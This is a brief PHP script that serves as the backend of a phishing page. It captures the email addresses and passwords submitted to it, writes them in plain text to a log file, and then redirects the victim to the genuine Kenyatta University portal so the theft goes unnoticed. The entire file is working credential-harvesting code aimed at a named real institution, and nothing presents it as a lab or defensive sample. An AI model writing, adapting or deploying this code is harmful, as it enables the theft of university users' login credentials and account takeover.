<?php
// Open a file to store credentials
$file = fopen("logs.txt", "a");

// Get the submitted email and password
$email = $_POST['email'];
$password = $_POST['password'];

// Save to the file
fwrite($file, "Email: " . $email . " | Password: " . $password . "\n");

// Close the file
fclose($file);

// Redirect to the real Kenyatta University portal
header("Location: https://portal.ku.ac.ke");
exit();
?>
